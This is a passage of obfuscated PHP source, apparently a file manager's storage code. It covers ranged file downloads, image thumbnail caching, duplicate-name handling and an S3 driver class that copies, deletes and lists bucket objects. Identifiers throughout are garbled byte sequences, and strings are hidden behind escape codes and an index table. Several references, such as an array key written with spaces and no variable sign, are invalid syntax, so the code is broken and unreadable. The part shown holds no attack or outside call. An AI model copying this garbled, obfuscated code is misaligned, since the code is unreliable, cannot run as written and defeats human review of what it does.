header("\103\x6f\x6e\x74\145\156\x74\55\122\x61\x6e\x67\145\x3a\40\142\x79\x74\145\x73\x20{$è‹øçü≠}\55{$ä™±Æ§∞}\57" . $Ü∫Ò‘ı™); } else { header($ﬂÊø¬ÁÃ[164]); } header($ﬂÊø¬ÁÃ[165]); $∆îΩò˘“ = !0; if ($_SERVER[$ﬂÊø¬ÁÃ[166]] == $ﬂÊø¬ÁÃ[167] && $Ü∫Ò‘ı™ > 1204 * 1024 * 1024 * 2) { $∆îΩò˘“ = !1; } if ($∆îΩò˘“) { header($ﬂÊø¬ÁÃ[168] . ($ä™±Æ§∞ - $è‹øçü≠ + 1)); } if ($_SERVER[$ﬂÊø¬ÁÃ[169]] == $ﬂÊø¬ÁÃ[170]) { return; } $÷À˜‚¡  = 1024 * 100; $Å§é“Ö∫ = 0; if ($Ë√Ü›úÀ) { $Å§é“Ö∫ = intval(1000 * 1000 * ($÷À˜‚¡  / $Ë√Ü›úÀ)); } while ($è‹øçü≠ <= $ä™±Æ§∞) { $˛ñã÷±à = timeFloat(); check_abort(); $ÓÒﬁ®õ’ = $ä™±Æ§∞ - $è‹øçü≠ + 1; if ($ÓÒﬁ®õ’ <= $÷À˜‚¡ ) { $÷À˜‚¡  = $ÓÒﬁ®õ’; } echo $this->fileSubstr($˜ªƒø¨Ω, $è‹øçü≠, $÷À˜‚¡ ); $è‹øçü≠ += $÷À˜‚¡ ; if ($÷À˜‚¡  == $ÓÒﬁ®õ’) { $è‹øçü≠ = $ä™±Æ§∞ + 1; } if ($Å§é“Ö∫) { $ñô›≥»÷ = intval(1000 * 1000 * (timeFloat() - $˛ñã÷±à)); $∆˛◊õ¸Â = $Å§é“Ö∫ - $ñô›≥»÷; if ($∆˛◊õ¸Â > 5) { usleep($∆˛◊õ¸Â); } } } } public function fileOutServer($ˆ·áª∆ó, $Ÿ€ßﬂ¸» = false, $â‰ªŸâì = false, $æüŸã˚§ = '') { $this->fileOut($ˆ·áª∆ó, $Ÿ€ßﬂ¸», $â‰ªŸâì, $æüŸã˚§); } public function fileOutLink($öÕäÌ‹¿) { header($_SERVER[Á≈ ä ∞][171] . $öÕäÌ‹¿); die; } public function cacheMethod($ÅûìëÜ¶, $≠∑ºÑ›Ã, $¿ûÉ”èË = null) { $≈≤Ô°¨è =& $_SERVER[Á≈ ä ∞]; static $õ◊˚ª∫‡ = array(); $óÊ≠¶ﬂ∫ = $≠∑ºÑ›Ã ? ltrim($this->getPathOuter($≠∑ºÑ›Ã), $≈≤Ô°¨è[18]) : $≈≤Ô°¨è[22]; $ı£‹´ˆ¨ = $≈≤Ô°¨è[172] . $ÅûìëÜ¶ . $≈≤Ô°¨è[173] . rtrim($óÊ≠¶ﬂ∫, $≈≤Ô°¨è[18]); if (is_null($ÅûìëÜ¶)) { $õ◊˚ª∫‡ = array(); return; } if (is_null($≠∑ºÑ›Ã)) { foreach ($õ◊˚ª∫‡ as $ı£‹´ˆ¨ => $Ü∞ ≠Ïã) { if (!strstr($ı£‹´ˆ¨, $≈≤Ô°¨è[172] . $ÅûìëÜ¶ . $≈≤Ô°¨è[174])) { continue; } unset($õ◊˚ª∫‡[$ı£‹´ˆ¨]); } return; } if (!is_null($¿ûÉ”èË)) { $õ◊˚ª∫‡[$ı£‹´ˆ¨] = $¿ûÉ”èË; return; } $—«í£¡Ì = isset($õ◊˚ª∫‡[$ı£‹´ˆ¨]) ? $õ◊˚ª∫‡[$ı£‹´ˆ¨] : null; if (!is_null($—«í£¡Ì)) { return $—«í£¡Ì; } $—«í£¡Ì = $this->{$ÅûìëÜ¶}($≠∑ºÑ›Ã); $õ◊˚ª∫‡[$ı£‹´ˆ¨] = $—«í£¡Ì; return $—«í£¡Ì; } public function cacheMethodInfoSet($êñëˆí¯, $Ÿ˜öËŸù, $ÏÈæçç  = false) { $úÓÒ ÑÔ =& $_SERVER[Á≈ ä ∞]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($úÓÒ ÑÔ[175], $êñëˆí¯, $Ÿ˜öËŸù); $this->cacheMethod($úÓÒ ÑÔ[176], $êñëˆí¯, $Ÿ˜öËŸù ? !1 : !0); if (is_array($ÏÈæçç )) { $this->cacheMethod($úÓÒ ÑÔ[177], $êñëˆí¯, $ÏÈæçç ); } } public function fileOutImage($ÃàŒúﬂ°, $»ÔÀê¥˜ = 250) { $—äÛ€£® =& $_SERVER[Á≈ ä ∞]; set_timeout(); if (substr($ÃàŒúﬂ°, 0, 4) == $—äÛ€£®[158]) { $this->fileOutLink($ÃàŒúﬂ°); } $ØÏéüùô = $this->info($ÃàŒúﬂ°); $™»ƒµú  = $ØÏéüùô[$—äÛ€£®[42]]; $àñÄ◊Ç˙ = !1; if (isset($GLOBALS[$—äÛ€£®[178]]) && $GLOBALS[$—äÛ€£®[178]][$—äÛ€£®[94]] == $ØÏéüùô[$—äÛ€£®[94]]) { $™ô¯Â¶≈ = $GLOBALS[$—äÛ€£®[178]][$—äÛ€£®[179]]; if (!$ØÏéüùô[$—äÛ€£®[180]]) { $ØÏéüùô[$—äÛ€£®[180]] = $GLOBALS[$—äÛ€£®[178]]; } if (isset($™ô¯Â¶≈[$—äÛ€£®[181]])) { if ($™ô¯Â¶≈[$—äÛ€£®[181]] <= $»ÔÀê¥˜ && $™ô¯Â¶≈[$—äÛ€£®[182]] <= $»ÔÀê¥˜) { $àñÄ◊Ç˙ = !0; } } $™»ƒµú  = $ØÏéüùô[$—äÛ€£®[180]][$—äÛ€£®[42]]; } if ($ØÏéüùô[$—äÛ€£®[86]] <= 1024 * 50 || $àñÄ◊Ç˙ || !function_exists($—äÛ€£®[183]) || $ØÏéüùô[$—äÛ€£®[184]] == $—äÛ€£®[185]) { return $this->fileOut($ÃàŒúﬂ°, !1, $™»ƒµú ); } if (isset($ØÏéüùô[$—äÛ€£®[180]][$—äÛ€£®[186]])) { $‡‚è°˘¯ = $ØÏéüùô[$—äÛ€£®[180]][$—äÛ€£®[186]]; } else { if (isset($ØÏéüùô[$—äÛ€£®[180]][$—äÛ€£®[187]])) { $‡‚è°˘¯ = $ØÏéüùô[$—äÛ€£®[180]][$—äÛ€£®[187]]; } } if (!$‡‚è°˘¯) { $‡‚è°˘¯ = md5("{$ØÏéüùô[$—äÛ€£®[42]]}\x5f{$ØÏéüùô[$—äÛ€£®[94]]}\137{$ØÏéüùô[$—äÛ€£®[86]]}\x5f{$»ÔÀê¥˜}"); } $ä¶œ•Ω≠ = "{$‡‚è°˘¯}\x5f{$»ÔÀê¥˜}\x2e\x70\x6e\147"; if (!($πäœ‹«∂ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $—äÛ€£®[188]))) { $◊ú£†·≈ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $—äÛ€£®[189]); } else { $◊ú£†·≈ = KodIO::make($πäœ‹«∂); } if ($πäœ‹«∂ = IO::fileNameExist($◊ú£†·≈, $ä¶œ•Ω≠)) { $äôú˚Êú = KodIO::make($πäœ‹«∂); return IO::fileOut($äôú˚Êú, !1, $™»ƒµú ); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $äôú˚Êú = DATA_THUMB . $ä¶œ•Ω≠; del_file($äôú˚Êú); if (!@file_exists($äôú˚Êú)) { $€òèâÎ¢ = TEMP_FILES; if (!is_dir($€òèâÎ¢)) { mk_dir($€òèâÎ¢); } $Ë˝˝îŒ˜ = $€òèâÎ¢ . $‡‚è°˘¯ . $—äÛ€£®[20] . $ØÏéüùô[$—äÛ€£®[184]]; if (!@file_exists($Ë˝˝îŒ˜)) { $Ë˝˝îŒ˜ = $this->download($ÃàŒúﬂ°, $Ë˝˝îŒ˜); } ImageThumb::createThumb($Ë˝˝îŒ˜, $äôú˚Êú, $»ÔÀê¥˜, $»ÔÀê¥˜ * 10); } if (!file_exists($äôú˚Êú) || filesize($äôú˚Êú) < 100) { return @file_exists($Ë˝˝îŒ˜) ? IO::fileOut($Ë˝˝îŒ˜) : $this->fileOut($ÃàŒúﬂ°); } if (!($éàõ›‰‰ = IO::move($äôú˚Êú, $◊ú£†·≈))) { return IO::fileOut($äôú˚Êú); } del_file($äôú˚Êú); IO::fileOut($éàõ›‰‰); } public function fileOutImageServer($÷û‰«◊, $Ãµ˛ñ“Á = 250) { $this->fileOutImage($÷û‰«◊, $Ãµ˛ñ“Á); } public function fileNameAuto($“’◊Ûíí, $ÍÂ∫—∞˚, $ïª—‚À = REPEAT_RENAME, $Óäã©‰Ä = false) { $û€ÒÓ — =& $_SERVER[Á≈ ä ∞]; $ûºËÿ†∞ = $“’◊Ûíí === $û€ÒÓ —[22] ? $ÍÂ∫—∞˚ : rtrim($“’◊Ûíí, $û€ÒÓ —[18]) . $û€ÒÓ —[18] . $ÍÂ∫—∞˚; if ($ïª—‚À == REPEAT_REPLACE || !$this->exist($ûºËÿ†∞) || $Óäã©‰Ä && $ïª—‚À != REPEAT_RENAME_FOLDER) { return $ÍÂ∫—∞˚; } if ($ïª—‚À == REPEAT_SKIP) { return !1; } $Ù°ìùÎÿ = $û€ÒÓ —[20] . get_path_ext($ÍÂ∫—∞˚); $Ù°ìùÎÿ = $Ù°ìùÎÿ == $û€ÒÓ —[20] || $Óäã©‰Ä ? $û€ÒÓ —[22] : $Ù°ìùÎÿ; $óß‡¢ÿ˜ = 1; $›í˚©íƒ = substr($ÍÂ∫—∞˚, 0, strlen($ÍÂ∫—∞˚) - strlen($Ù°ìùÎÿ)); $∆∞û∆íÆ = $›í˚©íƒ . "\x28{$óß‡¢ÿ˜}\x29{$Ù°ìùÎÿ}"; while ($this->exist(rtrim($“’◊Ûíí, $û€ÒÓ —[18]) . $û€ÒÓ —[18] . $∆∞û∆íÆ)) { $∆∞û∆íÆ = $›í˚©íƒ . "\50{$óß‡¢ÿ˜}\x29{$Ù°ìùÎÿ}"; $óß‡¢ÿ˜++; } return $∆∞û∆íÆ; } private function fileNameAutoList($ò≠§ÓÁ∑, $°öÍı˝Ä, $«˜‰∏®¯ = false) { $ﬂ»õÒ¬‹ =& $_SERVER[Á≈ ä ∞]; $ÙŸ™ôŸé = $this->listPath($ò≠§ÓÁ∑, !0); $ÙŸ™ôŸé = array_merge($ÙŸ™ôŸé[$ﬂ»õÒ¬‹[92]], $ÙŸ™ôŸé[$ﬂ»õÒ¬‹[93]]); $˘à‡øÂˆ = array_to_keyvalue($ÙŸ™ôŸé, $ﬂ»õÒ¬‹[22], $ﬂ»õÒ¬‹[42]); $¶˚∏€ß = $ﬂ»õÒ¬‹[20] . get_path_ext($°öÍı˝Ä); $¶˚∏€ß = $¶˚∏€ß == $ﬂ»õÒ¬‹[20] || $«˜‰∏®¯ ? $ﬂ»õÒ¬‹[22] : $¶˚∏€ß; $∞Ωˆä˚¥ = substr($°öÍı˝Ä, 0, strlen($°öÍı˝Ä) - strlen($¶˚∏€ß)); $Ô‡Ô›∂Î = $∞Ωˆä˚¥ . "\x28\60\x29{$¶˚∏€ß}"; for ($õ∞æ‡—€ = 1; $õ∞æ‡—€ <= count($˘à‡øÂˆ) + 1; $õ∞æ‡—€++) { $Ô‡Ô›∂Î = $∞Ωˆä˚¥ . "\x28{$õ∞æ‡—€}\x29{$¶˚∏€ß}"; if (!in_array_not_case($Ô‡Ô›∂Î, $˘à‡øÂˆ)) { return $Ô‡Ô›∂Î; } } return $Ô‡Ô›∂Î; } public function listAllFiles($¨‡„ﬁ≠ñ, $¸àºõö¨, $Ÿ˛˙¶¶• = array()) { $öÆÖ∞£ﬁ =& $_SERVER[Á≈ ä ∞]; if (empty($¸àºõö¨)) { return array(); } $áî€´◊¬ = array(); $¨‡„ﬁ≠ñ = trim($¨‡„ﬁ≠ñ, $öÆÖ∞£ﬁ[18]); foreach ($¸àºõö¨ as $â ±∏ãÚ) { $ƒèÂµÇ˜ = ltrim(substr(trim($â ±∏ãÚ, $öÆÖ∞£ﬁ[18]), strlen($¨‡„ﬁ≠ñ)), $öÆÖ∞£ﬁ[18]); $áî€´◊¬ = array_merge($áî€´◊¬, $this->slicePath($ƒèÂµÇ˜)); } $Ë»€‚Òú = array(); foreach (array_unique($áî€´◊¬) as $â ±∏ãÚ) { $Ó™ ˆ‡Ç = array($öÆÖ∞£ﬁ[94] => $this->getPathOuter($öÆÖ∞£ﬁ[18] . $¨‡„ﬁ≠ñ . $öÆÖ∞£ﬁ[18] . $â ±∏ãÚ), $öÆÖ∞£ﬁ[85] => 1, $öÆÖ∞£ﬁ[86] => 0); if (substr($â ±∏ãÚ, -1) != $öÆÖ∞£ﬁ[18]) { $Ó™ ˆ‡Ç[$öÆÖ∞£ﬁ[85]] = 0; $Ü≠´É∂Œ = $this->getPath($¨‡„ﬁ≠ñ . $öÆÖ∞£ﬁ[18] . $â ±∏ãÚ); $Ó™ ˆ‡Ç[$öÆÖ∞£ﬁ[86]] = isset($Ÿ˛˙¶¶•[$Ü≠´É∂Œ]) ? $Ÿ˛˙¶¶•[$Ü≠´É∂Œ] : $this->size($Ü≠´É∂Œ); } $Ë»€‚Òú[] = $Ó™ ˆ‡Ç; } return $Ë»€‚Òú; } public function slicePath($Ë˚˚ôà) { $∑¬§®û£ =& $_SERVER[Á≈ ä ∞]; $˚ùÁÃÓÕ = explode($∑¬§®û£[18], trim($Ë˚˚ôà, $∑¬§®û£[18])); $ê÷ßØªÊ = 0; do { ++$ê÷ßØªÊ; $√ô¬π©†[] = implode($∑¬§®û£[18], array_slice($˚ùÁÃÓÕ, 0, $ê÷ßØªÊ)) . $∑¬§®û£[18]; } while ($ê÷ßØªÊ < count($˚ùÁÃÓÕ)); $√ô¬π©†[count($˚ùÁÃÓÕ) - 1] = $Ë˚˚ôà; return $√ô¬π©†; } public function getHost() { $Î•áˆ§é =& $_SERVER[Á≈ ä ∞]; $ãÈô»·Ã = parse_url(trim($this->domain, $Î•áˆ§é[18])); $Ëÿ∆ÛÎÇ = isset($ãÈô»·Ã[$Î•áˆ§é[190]]) ? $ãÈô»·Ã[$Î•áˆ§é[190]] : http_type(); $ƒñ÷Áíû = isset($ãÈô»·Ã[$Î•áˆ§é[191]]) ? $ãÈô»·Ã[$Î•áˆ§é[191]] : $ãÈô»·Ã[$Î•áˆ§é[94]]; if (isset($ãÈô»·Ã[$Î•áˆ§é[192]])) { $ƒñ÷Áíû .= $Î•áˆ§é[4] . $ãÈô»·Ã[$Î•áˆ§é[192]]; } return $Ëÿ∆ÛÎÇ . $Î•áˆ§é[193] . $ƒñ÷Áíû; } public function pathEncode($èÉºª±á) { $˘ô◊ñã∂ =& $_SERVER[Á≈ ä ∞]; return str_replace($˘ô◊ñã∂[194], $˘ô◊ñã∂[18], rawurlencode($èÉºª±á)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($ôîÓó˛§) { set_timeout(); require_once SDK_DIR . $_SERVER[Á≈ ä ∞][195]; parent::__construct(); $this->_init($ôîÓó˛§); } public function _init($ô¯î”º«) { foreach ($ô¯î”º« as $≈Ïá¨”ª => $¨ì˜Çï˘) { if (isset($this->{$≈Ïá¨”ª})) { $this->{$≈Ïá¨”ª} = $¨ì˜Çï˘; } } $this->endpoint = $ô¯î”º«[$_SERVER[Á≈ ä ∞][196]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($´›„æÔË = "\166\64") { $this->signVer = $´›„æÔË; $this->client->setSignatureVersion($´›„æÔË); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $˙ªÚ÷ä◊ =& $_SERVER[Á≈ ä ∞]; $∑àêÇÃ… = $this->getBucketCors(); if (!$∑àêÇÃ… || !is_array($∑àêÇÃ…)) { return !1; } if ($∑àêÇÃ…[$˙ªÚ÷ä◊[197]] != $˙ªÚ÷ä◊[198] || $∑àêÇÃ…[$˙ªÚ÷ä◊[199]] != $˙ªÚ÷ä◊[198]) { return !1; } $„≠¶˛¡û = array_map($˙ªÚ÷ä◊[200], $∑àêÇÃ…[$˙ªÚ÷ä◊[201]]); if (!is_array($„≠¶˛¡û)) { $„≠¶˛¡û = array(); } $ï¢ãó“∑ = array($˙ªÚ÷ä◊[202], $˙ªÚ÷ä◊[203], $˙ªÚ÷ä◊[204], $˙ªÚ÷ä◊[205], $˙ªÚ÷ä◊[206]); $ß∂ÓÁ∞Ó = array_diff($ï¢ãó“∑, $„≠¶˛¡û); return empty($ß∂ÓÁ∞Ó); } public function mkfile($≥ﬁ„ˆ∫ê, $ÜÅº€Ó‚ = '', $óÌöƒøÛ = REPEAT_RENAME) { $Á€Îà´Æ = $this->setContent($≥ﬁ„ˆ∫ê, $ÜÅº€Ó‚); if ($Á€Îà´Æ !== !1) { return $this->getPathOuter($≥ﬁ„ˆ∫ê); } return !1; } public function mkdir($¿€Ééíá, $™çı˝ªÈ = REPEAT_SKIP) { $Ω∆‰∑¢µ =& $_SERVER[Á≈ ä ∞]; if (empty($¿€Ééíá) && $¿€Ééíá !== $Ω∆‰∑¢µ[207]) { return !1; } if ($™çı˝ªÈ && $this->_isFolder($¿€Ééíá)) { return $this->getPathOuter($¿€Ééíá); } $üπóπÌ¢ = $this->setContent($¿€Ééíá, $Ω∆‰∑¢µ[22], !0); if ($üπóπÌ¢ !== !1) { return $this->getPathOuter($¿€Ééíá); } return !1; } public function copyFile($∏∆’∏√’, $‡’÷Èßø, $Ø¸ô‹‚’ = array()) { $€ﬂ‹∆ÿê =& $_SERVER[Á≈ ä ∞]; $¡ŸúÇ°ù = $this->objectMeta($∏∆’∏√’); if (!$¡ŸúÇ°ù) { return !1; } if ($¡ŸúÇ°ù[$€ﬂ‹∆ÿê[86]] <= 1024 * 1024 * 200) { $†·Û√Èê = $this->client->copyObject($this->bucket, $∏∆’∏√’, $this->bucket, $‡’÷Èßø, $€ﬂ‹∆ÿê[208], $Ø¸ô‹‚’); } else { $†·Û√Èê = $this->client->multiCopyObject($this->bucket, $∏∆’∏√’, $this->bucket, $‡’÷Èßø, $Ø¸ô‹‚’); } $†·Û√Èê = $†·Û√Èê ? $this->getPathOuter($‡’÷Èßø) : !1; return $†·Û√Èê; } public function moveFile($¿©ﬂ—àû, $‘÷ªÀ¡Ñ) { if ($this->copyFile($¿©ﬂ—àû, $‘÷ªÀ¡Ñ)) { $this->delFile($¿©ﬂ—àû); return $this->getPathOuter($‘÷ªÀ¡Ñ); } return !1; } public function delFile($œÅÖàÍ™) { return $this->client->deleteObject($this->bucket, $œÅÖàÍ™); } public function delFolder($èÊﬂÖÄ¢) { $Ω®Ë˙öÒ =& $_SERVER[Á≈ ä ∞]; if (!$this->exist($èÊﬂÖÄ¢)) { return !0; } $this->listItemCache = !1; $ÀÂÚÄÆâ = $this->fileList($èÊﬂÖÄ¢); $this->listItemCache = !0; $‹Õáîã¯ = trim($èÊﬂÖÄ¢, $Ω®Ë˙öÒ[18]) . $Ω®Ë˙öÒ[18]; if (!empty($èÊﬂÖÄ¢) && $èÊﬂÖÄ¢ !== $Ω®Ë˙öÒ[207] && !in_array($‹Õáîã¯, $ÀÂÚÄÆâ[$Ω®Ë˙öÒ[92]])) { $ÀÂÚÄÆâ[$Ω®Ë˙öÒ[92]][] = $‹Õáîã¯; } $Ñ»ﬂËŒ∞ = $this->delByBatch($ÀÂÚÄÆâ[$Ω®Ë˙öÒ[93]]); if (!$Ñ»ﬂËŒ∞) { return !1; } $Ñ»ﬂËŒ∞ = $this->delByBatch($ÀÂÚÄÆâ[$Ω®Ë˙öÒ[92]]); if (!$Ñ»ﬂËŒ∞) { return !1; } return $this->delFile($‹Õáîã¯); } private function delByBatch($‚ò¨ïÃ∫) { foreach (array_chunk($‚ò¨ïÃ∫, 1000) as $“îö∂ ò) { $ÖÚ’π≠± = $this->client->deleteObjects($this->bucket, $“îö∂ ò); if (!$ÖÚ’π≠±) { return !1; } } return !0; } public function rename($ã¡Ë©ÌÛ, $’ÚÜ ¿õ) { return $this->renameObject($ã¡Ë©ÌÛ, $’ÚÜ ¿õ); } public function listPath($Ú“Ÿ•Úﬂ, $…ç≈ﬁúÔ = false) { $≠–òÚ…¢ =& $_SERVER[Á≈ ä ∞]; $åΩÀÇÀÉ = $this->fileList($Ú“Ÿ•Úﬂ, $≠–òÚ…¢[18], !0); foreach ($åΩÀÇÀÉ[$≠–òÚ…¢[92]] as $¥ŒÚÊ—Ä => $µÿ¶á≥Ô) { $åΩÀÇÀÉ[$≠–òÚ…¢[92]][$¥ŒÚÊ—Ä] = $this->folderInfo($µÿ¶á≥Ô, $…ç≈ﬁúÔ, $µÿ¶á≥Ô); } foreach ($åΩÀÇÀÉ[$≠–òÚ…¢[93]] as $¥ŒÚÊ—Ä => $µÿ¶á≥Ô) { $åΩÀÇÀÉ[$≠–òÚ…¢[93]][$¥ŒÚÊ—Ä] = $this->fileInfo($µÿ¶á≥Ô[$≠–òÚ…¢[42]], $…ç≈ﬁúÔ, $µÿ¶á≥Ô); } return $åΩÀÇÀÉ; } protected function infoChildren($øíç”Âö, &$£ª∂ù¡Ï) { $∑ÛÇÖÊ˝ =& $_SERVER[Á≈ ä ∞]; $Ã®¶ßÔ¯ = $this->fileList($øíç”Âö, $∑ÛÇÖÊ˝[22], !0); $£ª∂ù¡Ï[$∑ÛÇÖÊ˝[88]] += count($Ã®¶ßÔ¯[$∑ÛÇÖÊ˝[92]]); $£ª∂ù¡Ï[$∑ÛÇÖÊ˝[87]] += count($Ã®¶ßÔ¯[$∑ÛÇÖÊ˝[93]]); foreach ($Ã®¶ßÔ¯[$∑ÛÇÖÊ˝[93]] as $«º˙â’ƒ) { if (!$«º˙â’ƒ || !$«º˙â’ƒ[$∑ÛÇÖÊ˝[86]]) { continue; } $£ª∂ù¡Ï[$∑ÛÇÖÊ˝[86]] += $«º˙â’ƒ[$∑ÛÇÖÊ˝[86]]; } } private function fileInfo($”ëÆ˘´, $ù◊Ù¨–” = false, $Ä¯á§π† = array()) { $ü˛õ‡»⁄ =& $_SERVER[Á≈ ä ∞]; $Õ÷ÂÊ©ã = array($ü˛õ‡»⁄[42] => $this->pathThis($”ëÆ˘´), $ü˛õ‡»⁄[94] => $this->getPathOuter($”ëÆ˘´), $ü˛õ‡»⁄[43] => $ü˛õ‡»⁄[209], $ü˛õ‡»⁄[184] => $this->ext($”ëÆ˘´), $ü˛õ‡»⁄[86] => isset($Ä¯á§π†[$ü˛õ‡»⁄[86]]) ? $Ä¯á§π†[$ü˛õ‡»⁄[86]] : 0); if ($ù◊Ù¨–”) { return $Õ÷ÂÊ©ã; } $Õ÷ÂÊ©ã[$ü˛õ‡»⁄[210]] = $Õ÷ÂÊ©ã[$ü˛õ‡»⁄[95]] = 0; $Õ÷ÂÊ©ã[$ü˛õ‡»⁄[211]] = $Õ÷ÂÊ©ã[$ü˛õ‡»⁄[212]] = !0; if (empty($Ä¯á§π†)) { $Ä¯á§π† = $this->objectMeta($”ëÆ˘´); if (!$Ä¯á§π†) { return $Õ÷ÂÊ©ã; } } if (isset($Ä¯á§π†[$ü˛õ‡»⁄[213]])) { $Õ÷ÂÊ©ã[$ü˛õ‡»⁄[95]] = $Ä¯á§π†[$ü˛õ‡»⁄[213]]; } if (isset($Ä¯á§π†[$ü˛õ‡»⁄[86]])) { $Õ÷ÂÊ©ã[$ü˛õ‡»⁄[86]] = $Ä¯á§π†[$ü˛õ‡»⁄[86]]; } return $Õ÷ÂÊ©ã; } private function folderInfo($€®¨ãùÕ, $–Ô‹¶ù‡ = false, $ªÅ„Ç‰Æ = array()) { $∂Øµ®∏é =& $_SERVER[Á≈ ä ∞]; $ºæŸ£Ç¿ = array($∂Øµ®∏é[42] => $this->pathThis($€®¨ãùÕ), $∂Øµ®∏é[94] => $this->getPathOuter($∂Øµ®∏é[18] . $€®¨ãùÕ), $∂Øµ®∏é[43] => $∂Øµ®∏é[85]); if ($–Ô‹¶ù‡) { return $ºæŸ£Ç¿; } $ºæŸ£Ç¿[$∂Øµ®∏é[210]] = $ºæŸ£Ç¿[$∂Øµ®∏é[95]] = 0; $ºæŸ£Ç¿[$∂Øµ®∏é[211]] = $ºæŸ£Ç¿[$∂Øµ®∏é[212]] = !0; if ($€®¨ãùÕ == $∂Øµ®∏é[22]) { return $ºæŸ£Ç¿; } if (empty($ªÅ„Ç‰Æ)) { $ªÅ„Ç‰Æ = $this->objectMeta(trim($€®¨ãùÕ, $∂Øµ®∏é[18]) . $∂Øµ®∏é[18]); } if (isset($ªÅ„Ç‰Æ[$∂Øµ®∏é[213]])) { $ºæŸ£Ç¿[$∂Øµ®∏é[210]] = $ªÅ„Ç‰Æ[$∂Øµ®∏é[213]]; } return $ºæŸ£Ç¿; } private function fileList($üÂ«’®€, $ñúÎüîñ = '', $´Â∆æ…Ù = 0) { $°µ—ÌÎı =& $_SERVER[Á≈ ä ∞]; $¢ë˛˜ƒ = rtrim($üÂ«’®€, $°µ—ÌÎı[18]) . $°µ—ÌÎı[18]; $ú“Å†ÌÑ = $this->listObjs($¢ë˛˜ƒ, null, null, $ñúÎüîñ); if (!$ú“Å†ÌÑ) { return array($°µ—ÌÎı[92] => array(), $°µ—ÌÎı[93] => array()); } $¢∆Û—…” = $ÒÁπ¯Âè = array(); foreach ($ú“Å†ÌÑ[$°µ—ÌÎı[214]] as $êÒ¶ãï‡) { $Öà˙•’‹ = $êÒ¶ãï‡[$°µ—ÌÎı[42]]; if ($Öà˙•’‹ == $¢ë˛˜ƒ) { continue; } $î‡ßﬁ€ô = isset($êÒ¶ãï‡[$°µ—ÌÎı[86]]) ? $êÒ¶ãï‡[$°µ—ÌÎı[86]] : 0; $úœäŒì¸ = $î‡ßﬁ€ô == 0 && substr($Öà˙•’‹, strlen($Öà˙•’‹) - 1, 1) == $°µ—ÌÎı[18] ? !0 : !1; $this->cacheMethodInfoSet($Öà˙•’‹, $úœäŒì¸, $êÒ¶ãï‡); if ($úœäŒì¸) { $¢∆Û—…”[] = $Öà˙•’‹; continue; } $ÒÁπ¯Âè[] = $´Â∆æ…Ù ? $êÒ¶ãï‡ : $Öà˙•’‹; } foreach ($ú“Å†ÌÑ[$°µ—ÌÎı[215]] as $êÒ¶ãï‡) { $¢∆Û—…”[] = $êÒ¶ãï‡[$°µ—ÌÎı[42]]; $this->cacheMethodInfoSet($êÒ¶ãï‡[$°µ—ÌÎı[42]], !0); } $this->cacheMethodInfoSet($üÂ«’®€, !0); return array($°µ—ÌÎı[92] => $¢∆Û—…”, $°µ—ÌÎı[93] => $ÒÁπ¯Âè); } private function listObjs($‚‘õÜáÈ, $˘£Ωë›˙ = null, $„–˛ßÅ• = null, $ÿù÷Åè = null) { $à¶…ª‘◊ =& $_SERVER[Á≈ ä ∞]; $‚‘õÜáÈ = trim($‚‘õÜáÈ, $à¶…ª‘◊[18]); $È®»ÈÀ∫ = empty($‚‘õÜáÈ) && $‚‘õÜáÈ !== $à¶…ª‘◊[207] ? $à¶…ª‘◊[22] : $‚‘õÜáÈ . $à¶…ª‘◊[18]; return $this->client->getBucket($this->bucket, $È®»ÈÀ∫, $˘£Ωë›˙, $„–˛ßÅ•, $ÿù÷Åè, !0); } public function has($Æù…÷Ã≠, $ìôÅõñø = false, $≠ìªÁÆë = true) { $éÔ•¡„ü =& $_SERVER[Á≈ ä ∞]; $Æù…÷Ã≠ = trim($Æù…÷Ã≠, $éÔ•¡„ü[18]); $Í—È§˘Î = empty($Æù…÷Ã≠) && $Æù…÷Ã≠ !== $éÔ•¡„ü[207] ? $éÔ•¡„ü[22] : $Æù…÷Ã≠ . $éÔ•¡„ü[18]; $ä«ß≤ì˘ = null; $Úà¥«‡∞ = 500; $”™¸üÒñ = $éÔ•¡„ü[18]; $†ÉÎıõ• = $£ƒ€¡∏˚ = array(); while (!0) { $óª°à‡Ä = $this->listObjs($Æù…÷Ã≠, $ä«ß≤ì˘, $Úà¥«‡∞, $”™¸üÒñ); if (!$óª°à‡Ä) { break; } $ä«ß≤ì˘ = $óª°à‡Ä[$éÔ•¡„ü[216]]; $ñ€¬√Õ‡ = $óª°à‡Ä[$éÔ•¡„ü[214]]; $”ª∞¿ßƒ = $óª°à‡Ä[$éÔ•¡„ü[215]]; if (empty($ñ€¬√Õ‡) && empty($”ª∞¿ßƒ)) { break; } if (count($ñ€¬√Õ‡) == 1 && $ñ€¬√Õ‡[0][$éÔ•¡„ü[42]] == $Í—È§˘Î) { break; } if ($ìôÅõñø) { if (count($ñ€¬√Õ‡)) { $ñ€¬√Õ‡ = array_column($ñ€¬√Õ‡, $éÔ•¡„ü[42]); $†ÉÎıõ• = array_merge($†ÉÎıõ•, $ñ€¬√Õ‡); } if (count($”ª∞¿ßƒ)) { $”ª∞¿ßƒ = array_column($”ª∞¿ßƒ, $éÔ•¡„ü[42]); $£ƒ€¡∏˚ = array_merge($£ƒ€¡∏˚, $”ª∞¿ßƒ); } if ($ä«ß≤ì˘ === null) { break; } continue; } if ($≠ìªÁÆë) { if (!empty($ñ€¬√Õ‡)) { if (count($ñ€¬√Õ‡) > 1 || isset($ñ€¬√Õ‡[0][$éÔ•¡„ü[42]]) && $ñ€¬√Õ‡[0][$éÔ•¡„ü[42]] != $Í—È§˘Î) { return !0; } } } else { if (!empty($”ª∞¿ßƒ)) { return !0; } } if ($ä«ß≤ì˘ === null) { break; } } if ($ìôÅõñø) { $†ÉÎıõ• = array_diff($†ÉÎıõ•, array($Í—È§˘Î)); $†ÉÎıõ• = count(array_unique($†ÉÎıõ•)); $£ƒ€¡∏˚ = 